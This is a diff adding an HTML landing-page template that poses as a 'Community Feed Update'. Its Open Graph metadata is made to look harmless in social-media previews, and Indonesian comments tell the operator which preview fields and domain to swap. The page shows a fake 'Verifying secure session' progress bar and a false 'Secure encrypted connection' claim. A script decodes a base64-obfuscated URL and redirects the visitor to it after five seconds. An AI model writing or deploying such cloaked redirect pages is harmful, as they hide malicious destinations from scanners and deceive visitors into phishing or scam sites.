@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<!-- ================== BASIC ================== -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- ================== SAFE TITLE ================== -->
+<title>Community Feed Update</title>
+
+<!-- ================== SAFE DESCRIPTION ================== -->
+<meta name="description" content="Latest shared content available">
+
+<!-- ================== THEME ================== -->
+<meta name="theme-color" content="#0b1220">
+
+<!-- ================== SAFE OG META ================== -->
+
+<!-- GANTI JUDUL PREVIEW -->
+<meta property="og:title" content="📌 Community Update">
+
+<!-- GANTI DESKRIPSI PREVIEW -->
+<meta property="og:description" content="Tap to view the latest update">
+
+<!-- ================== EDIT IMAGE ================== -->
+<!-- TARUH FILE preview1.jpg DI ROOT REPO -->
+<meta property="og:image" content="https://room1.lovegallery.online/preview1.jpg">
+<meta property="og:image:secure_url" content="https://room1.lovegallery.online/preview1.jpg">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- ================== EDIT DOMAIN ================== -->
+<meta property="og:url" content="https://room1.lovegallery.online/">
+
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="CommunityFeed">
+
+<!-- ================== TWITTER ================== -->
+<meta name="twitter:card" content="summary_large_image">
+
+<!-- ================== PRELOAD ================== -->
+<link rel="preload" as="image" href="/preview1.jpg">
+
+<style>
+
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+}
+
+html,body{
+  width:100%;
+  height:100%;
+}
+
+body{
+  overflow:hidden;
+  font-family:Arial,sans-serif;
+  color:#fff;
+  background:
+    radial-gradient(circle at top,#152238 0%,#05070c 60%);
+}
+
+/* ================== MAIN ================== */
+
+.container{
+  width:100%;
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  padding:20px;
+  text-align:center;
+}
+
+/* ================== IMAGE ================== */
+
+.preview{
+  width:100%;
+  max-width:430px;
+  border-radius:24px;
+  overflow:hidden;
+  position:relative;
+  box-shadow:
+    0 0 25px rgba(59,130,246,0.20),
+    0 0 60px rgba(59,130,246,0.08);
+  animation:float 3.5s ease-in-out infinite;
+}
+
+.preview::after{
+  content:"";
+  position:absolute;
+  inset:0;
+  background:
+    linear-gradient(
+      to top,
+      rgba(0,0,0,0.15),
+      transparent
+    );
+}
+
+.preview img{
+  width:100%;
+  display:block;
+}
+
+/* ================== FLOAT ================== */
+
+@keyframes float{
+  50%{
+    transform:translateY(-6px);
+  }
+}
+
+/* ================== STATUS ================== */
+
+.status{
+  margin-top:22px;
+  font-size:28px;
+  font-weight:700;
+  letter-spacing:1px;
+}
+
+.dot{
+  color:#60a5fa;
+  animation:blink 1s infinite;
+}
+
+@keyframes blink{
+  50%{
+    opacity:0.35;
+  }
+}
+
+/* ================== LOADER ================== */
+
+.loading-box{
+  width:290px;
+  margin-top:22px;
+}
+
+.loading-text{
+  font-size:14px;
+  color:#d5d5d5;
+  margin-bottom:12px;
+  letter-spacing:0.3px;
+}
+
+.bar{
+  width:100%;
+  height:10px;
+  background:#161616;
+  border-radius:999px;
+  overflow:hidden;
+  position:relative;
+}
+
+.fill{
+  width:0%;
+  height:100%;
+  border-radius:999px;
+
+  background:
+    linear-gradient(
+      90deg,
+      #2563eb,
+      #60a5fa,
+      #93c5fd
+    );
+
+  animation:load 5s linear forwards;
+  position:relative;
+}
+
+.fill::after{
+  content:"";
+  position:absolute;
+  top:0;
+  right:0;
+  width:45px;
+  height:100%;
+  background:rgba(255,255,255,0.35);
+  filter:blur(10px);
+}
+
+@keyframes load{
+  from{
+    width:0%;
+  }
+
+  to{
+    width:100%;
+  }
+}
+
+/* ================== PERCENT ================== */
+
+.percent{
+  margin-top:10px;
+  color:#8ab4ff;
+  font-size:13px;
+  font-weight:bold;
+}
+
+/* ================== NOTES ================== */
+
+.note{
+  margin-top:16px;
+  color:#9b9b9b;
+  font-size:13px;
+  letter-spacing:0.2px;
+}
+
+.secure{
+  margin-top:8px;
+  color:#4ade80;
+  font-size:12px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <!-- ================== EDIT MAIN IMAGE ================== -->
+  <div class="preview">
+    <img src="/preview1.jpg" alt="Preview">
+  </div>
+
+  <!-- ================== STATUS ================== -->
+  <div class="status">
+    <span class="dot">●</span> CONNECTING...
+  </div>
+
+  <!-- ================== LOADING ================== -->
+  <div class="loading-box">
+
+    <div class="loading-text">
+      Verifying secure session...
+    </div>
+
+    <div class="bar">
+      <div class="fill"></div>
+    </div>
+
+    <!-- AUTO PERCENT -->
+    <div class="percent" id="percent">
+      0%
+    </div>
+
+  </div>
+
+  <!-- ================== FOOTER NOTE ================== -->
+  <div class="note">
+    Please wait while loading content...
+  </div>
+
+  <div class="secure">
+    ✓ Secure encrypted connection
+  </div>
+
+</div>
+
+<script>
+
+  // ================== ENCODED TARGET LINK ==================
+
+  const target = atob(
+    "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk="
+  );
+
+  // ================== AUTO PERCENT ==================
+
+  const percent = document.getElementById("percent");
+
+  let count = 0;
+
+  const loader = setInterval(() => {
+
+    count++;
+
+    percent.innerText = count + "%";
+
+    if(count >= 100){
+      clearInterval(loader);
+    }
+
+  }, 50);
+
+  // ================== REDIRECT TIMER ==================
+
+  setTimeout(() => {
+    window.location.href = target;
+  }, 5000);
+
+</script>
+
+</body>
+</html>
